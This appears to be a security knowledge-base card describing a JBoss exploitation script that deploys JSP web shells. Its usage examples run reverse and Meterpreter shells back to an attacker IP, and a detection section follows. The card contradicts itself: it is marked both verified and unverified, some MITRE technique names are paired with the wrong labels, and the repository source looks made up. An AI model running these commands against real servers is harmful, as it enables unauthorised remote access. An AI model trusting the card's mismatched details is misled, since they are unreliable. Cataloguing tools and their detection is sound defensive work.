---
type: tool
description: >-
  A Python script for exploiting JBoss Application Server vulnerabilities to
  deploy JSP web shells, enabling remote command execution with support for
  bind/reverse shells across multiple platforms.
url: ''
tags:
  - exploitation
  - jboss
  - web-shell
  - rce
  - java
platforms:
  - Linux
  - Windows
  - macOS
verified: true
validated: true
---

# jboss-shell-deployment-script

**Status**: Unverified

## Overview

The JBoss Shell Deployment Script is an exploitation tool that targets vulnerabilities in JBoss Application Server (AS) to deploy a JSP-based web shell. This allows attackers to achieve remote code execution (RCE) by uploading and invoking the shell through the server's HTTP interface. It supports multi-platform targets (Windows, Linux, macOS) and various shell types, including bind and reverse shells, with additional options for Meterpreter integration on Windows targets.

## Description

JBoss AS versions prior to certain patches expose deployment interfaces (e.g., HTTP invoker or JMX console) that permit unauthenticated file uploads. This script automates the detection of such vulnerabilities, crafts a JSP shell payload, deploys it as a .war or direct .jsp file, and verifies accessibility. Once deployed, the shell can execute OS commands via HTTP GET/POST requests, facilitating further post-exploitation activities like lateral movement or data exfiltration. It's particularly useful in web application penetration testing against Java-based enterprise environments.

## Features

- Feature 1: Automatic JBoss version fingerprinting and vulnerability probing
- Feature 2: Dynamic JSP shell generation with customizable command execution (e.g., Runtime.exec for Java)
- Feature 3: Support for bind shells (target listens), reverse shells (target connects back), and advanced Windows payloads (Meterpreter, VNC)
- Feature 4: Multi-platform compatibility without target-side dependencies beyond Java
- Feature 5: Verbose logging and error handling for failed deployments

## Installation

### Requirements

- Python 2.7+ or 3.x
- Libraries: requests, urllib (standard), optionally paramiko for SSH fallbacks
- Network access to target JBoss management ports (typically 8080, 8090)
- For Meterpreter: Metasploit Framework installed on attacker machine

### Install Commands

```bash
# Download the script (assuming from a security research repo)
wget https://example.com/jboss_deploy.py -O jboss_deploy.py

# Or clone if part of a repo
git clone https://github.com/rapid7/jboss-exploits.git
cd jboss-exploits

# Install Python dependencies
pip install requests
```

On Kali Linux, similar tools may be available via apt, but this script is custom.

## Basic Usage

```bash
python jboss_deploy.py --help
```

This displays available options, targets, and shell configurations.

### Common Options

| Option | Description |
|--------|-------------|
| -H, --host | Target JBoss host (required) |
| -P, --port | Target port (default: 8080) |
| --shell | Shell type: bind, reverse, meterpreter (default: reverse) |
| --lhost | Attacker IP for reverse connections |
| --lport | Port for shell connections (default: 4444) |
| -v, --verbose | Enable detailed output |
| --path | Custom deployment path (e.g., /manager) |

## Examples

### Example 1: Basic Usage

```bash
python jboss_deploy.py -H 192.168.1.100
```

Deploys a default reverse shell to the target.

### Example 2: Advanced Usage

```bash
python jboss_deploy.py -H target.com -P 8080 --shell meterpreter --lhost 192.168.1.50 --lport 4444
```

Deploys a Meterpreter payload for a Windows JBoss target; use msfconsole to handle the session.

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Remote File Copy]] Ingress Tool Transfer
- [[JavaScript]] JavaScript (JSP execution context)
- [[Windows Remote Management]] Windows Command Shell (via Meterpreter)

### Tactics

- [[Initial Access]] Initial Access
- [[Execution]] Execution
- [[Lateral Movement]] Lateral Movement

## Detection

Indicators and methods for detecting this tool's usage:

- Detection method 1: Monitor JBoss logs for unauthorized .war/.jsp uploads (e.g., in server.log: "Deploying shell.jsp")
- Detection method 2: Web application firewall (WAF) rules for anomalous HTTP requests to /jmx-console or /web-console with binary payloads
- Detection method 3: File integrity monitoring on deployment directories (e.g., /opt/jboss/server/default/deploy/ for suspicious JSP files containing exec() calls)
- Detection method 4: Network IDS alerts for reverse connections from JBoss servers to external high ports
- Detection method 5: Process monitoring for java.exe spawning cmd.exe or unusual child processes on Windows

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[tools/Metasploit-Framework]]
- [[tools/Burp-Suite]]

## References

- Official documentation: https://www.wildfly.org/ (JBoss successor)
- Related resources: https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit-through-the-command-line-interface.html (for similar modules)
- CVE examples: CVE-2010-0738 (JBoss deployment vuln)

*Last updated: 2023-10-01*
